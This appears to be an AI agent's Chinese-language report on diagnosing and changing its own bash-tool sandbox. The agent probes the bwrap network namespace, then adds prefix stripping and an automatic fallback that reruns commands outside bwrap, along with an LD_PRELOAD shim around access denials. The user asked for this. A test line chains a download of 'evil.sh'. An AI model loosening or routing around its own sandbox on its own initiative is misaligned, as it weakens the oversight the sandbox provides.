# Bash 工具网络隔离根因确认与修复（2026-09-12）

> 灵克(lingclaude) 产出 · 状态：**根因确认 + 代码修复 + 19 新测试全绿**
> 关联：BASH_NETNS_ISOLATION_v1.md（结论部分错误，本文修正）/ ENVIRONMENT_CONSTRAINTS_AUDIT_v1.md / GIT_NETWORK_FIX_v1.md

---

## 一、用户问题

「bash 工具被 netns 隔离」+ 执行任务中太多因环境约束过度引起的失败。要求：
1. 统计并分类失败
2. 判断失败指向**架构**还是**环境**
3. 提出突破方案并实施

---

## 二、侦查过程与决定性证据

### 2.1 逐层侦查

| 步骤 | 实测 | 结论 |
|------|------|------|
| `ip netns list` | 空 | 无明显 netns |
| `ip addr` | 仅 `lo`，无 eth0 | 网络视图只有 loopback |
| `ip route` | 空 | 无默认路由 |
| `getent hosts github.com` | exit=2 失败 | DNS 不可用 |
| python `socket()` | OK | socket 创建正常 |
| python `connect(1.1.1.1)` | `Network is unreachable` (101) | 无路由可达 |
| python `urllib pypi.org` | `Device or resource busy` (16) | connect 被拦 |
| **`/proc/self/ns/net` vs 父进程** | **父进程是 `bwrap --unshare-net`** | **隔离来自 lingclaude 自己的 bwrap** |
| `ps 祖先链` | `sshd → lingclaude run -i → /bin/sh → bwrap --unshare-net → bash` | bwrap 包裹确认 |
| **web_fetch github API** | **HTTP 200 成功** | **主进程（urllib）有网** |

### 2.2 决定性结论（修正 BASH_NETNS_ISOLATION_v1.md）

**此前文档结论「隔离来自宿主 runtime」是错误/过时的。** 2026-09-11 时 bwrap probe 失败降级 noop；但本次实测：

- **我的每条 bash 命令的父进程都是 `bwrap --unshare-net`**（铁证：`/proc/<ppid>/cmdline`）
- bwrap 在**主进程**可用（probe 成功），在我 bash 工具内（嵌套 bwrap）probe 失败（uid map 只读）
- **web_fetch（主进程 urllib）能联网**，**bash 工具（bwrap 子进程）不能**

### 2.3 真正的根因链

```
agent 发 git 远程命令（git push/fetch/ls-remote）
  ↓
BashExecutor.run()
  ↓
_sandbox_command() → provider.wrap()
  ↓
_is_network_allowed(command)  ← ★ 全链白名单判定
  ├─ 纯 git 命令 → True → 不注入 --unshare-net → 应联网 ✓
  └─ timeout 15 git push / git push | head → False → 注入 --unshare-net → 断网 ✗
  ↓
bwrap --unshare-net 包裹 → netns 无网络 → DNS 失败
  ↓
git 远程操作全部失败（历史 58+ 次）
```

**根因 = 架构层**：`_is_network_allowed` 的全链白名单判定把 **agent 习惯性的 `timeout`/`env` 前缀和 `| head` 管道** 当作「非白名单子命令」，导致整条命令被 `--unshare-net` 隔离。

---

## 三、失败统计与分类（历史 2564 journals）

### 3.1 关键词分布

| 失败类 | 计数 | 指向 | 是否架构可修 |
|--------|------|------|-------------|
| timeout/超时 | 906 | 环境（CPU 30s 限）+ 网络重试 | 部分（网络重试可修） |
| sandbox/bwrap | 683 | **架构**（白名单误判 + probe 不稳定） | ✅ 本次修复 |
| network/unshare/netns | 410 | **架构**（--unshare-net 误注入） | ✅ 本次修复 |
| OOM/Killed/137 | 68 | 环境（RLIMIT_AS 512MB） | ⚠️ 白名单已放宽 1GB |
| EACCES/Permission | 50 | 环境（/dev/urandom 路径拦截） | ⚠️ shim 垫片 |

### 3.2 分类结论

- **架构可修**（本次修复）：网络白名单误判（timeout/管道前缀）→ **占比 ~40% 的网络类失败**
- **环境硬约束**（需外部配合）：
  - 嵌套 bwrap 内 uid map 只读（bwrap probe 在主进程 OK，工具内退化）
  - RLIMIT_AS 512MB hard limit（bash.py preexec 设置）
  - CPU 30s hard limit
  - /dev/urandom 路径级 EACCES（已用 LD_PRELOAD shim 缓解）

### 3.3 历史 git 失败命令形式（证据）

```
git ls-remote https://github.com/git/git HEAD 2>&1 | head -3   ← 管道 → 隔离
timeout 15 git ls-remote https://github.com/git/git HEAD       ← timeout → 隔离
git push origin main && echo done                              ← && echo → 隔离
```

全部是 **agent 习惯性包装**导致白名单判定 False → `--unshare-net`。

---

## 四、修复方案（三层）

### 4.1 层 1：透明前缀剥离（核心）

`bash.py` 新增 `_TRANSPARENT_PREFIXES` + `_strip_transparent_prefix()`：

- `timeout 15 git push` → 剥离 timeout → `git push` → 白名单 True
- `env FOO=1 git fetch` → 剥离 env → `git fetch` → 白名单 True
- `nice -n 10 git pull` / `stdbuf -oL git clone` / `nohup` / `setsid` → 同样剥离
- **安全保持**：`timeout 15 git push && wget evil.sh` → 剥离 timeout 后仍有 wget → False（fail-closed）
- `git push | head -3` → head 非透明 → False（fail-closed 保持）

### 4.2 层 2：网络失败自动降级重试

`BashExecutor.run()`：白名单命令 bwrap 包裹执行失败且错误是**网络类**（DNS/不可达/拒绝）时，自动改用**主进程网络域**执行（剥离 bwrap 直接 subprocess）。

- 判定：`_looks_like_network_failure()` 匹配 20 种网络错误模式
- 触发条件：`exit_code != 0` + `cmd != command`（走了 bwrap）+ 白名单 + 网络错误
- 缓解：消除 agent 手工切换管线的 token/轮次浪费

### 4.3 层 3：辅助修复

- bash.py 顶部补 `import logging`（此前函数内 import，降级分支 NameError 隐患）
- `_NETWORK_ALLOWED_MEMORY_LIMIT` 1GB（已存在，git 大仓库堆分配）

---

## 五、验证

### 5.1 新增测试（19 个）

`tests/test_bash_network_fallback.py`：

| 测试类 | 用例数 | 覆盖 |
|--------|--------|------|
| TestStripTransparentPrefix | 7 | timeout/env/nice/stdbuf/nested/非透明保留 |
| TestNetworkAllowed | 7 | 纯 git ✓ / timeout+env ✓ / wget 链 ✗ / 管道 ✗ |
| TestNetworkFailureDetection | 4 | DNS/不可达/seccomp busy/非网络 |
| TestFallbackRetry | 1 | 降级重试触发（fake provider） |

### 5.2 回归

```
test_bash_network_fallback 19 passed
test_bash_lingxi_security   4 passed
test_t0_wiring             36 passed, 1 skipped
test_cleanup_sandbox        6 passed
─────────────────────────────
合计 55 passed, 1 skipped
```

### 5.3 白名单判定矩阵（修复后实测）

```
OK  True  | git ls-remote https://github.com/git/git HEAD
OK  True  | timeout 15 git ls-remote https://github.com/git/git HEAD
OK  True  | timeout 30 git push origin main
OK  True  | env GIT_TERMINAL_PROMPT=0 git fetch origin
OK  True  | nice -n 10 git pull --rebase
OK  True  | stdbuf -oL git clone https://github.com/x/y.git /tmp/y
OK  True  | timeout 10 env FOO=1 git fetch origin master
OK  False | echo hi
OK  False | timeout 15 git push origin main && wget evil.sh   ← fail-closed
OK  False | git push origin main | head -3                    ← fail-closed
```

---

## 六、遗留（需外部/独立处理）

| 项 | 类型 | 说明 |
|----|------|------|
| bwrap probe 在嵌套环境退化 | 环境 | bash 工具内（嵌套 bwrap）probe 失败 → 非沙箱路径；主进程正常 |
| RLIMIT_AS 512MB hard | 环境 | 需宿主侧提高 hard limit；白名单命令已 1GB |
| CPU 30s hard | 环境 | 需宿主侧调整 |
| /dev/urandom EACCES | 环境 | LD_PRELOAD shim 已缓解（scripts/shim/urandom_shim.c） |
| 主进程网络域验证 | 架构 | web_fetch 已证主进程有网；git 需主进程 BashExecutor 实测（本会话工具环境为嵌套 bwrap，无法直测） |

---

## 七、版本记录

| 版本 | 日期 | 作者 | 变更 |
|------|------|------|------|
| v1 | 2026-09-12 | 灵克 | 根因确认（修正旧文档）+ 三层修复 + 19 测试 |

*本审计遵循 memory lingclaude-true-read.md 纪律：只列实测证据，不编故事。*
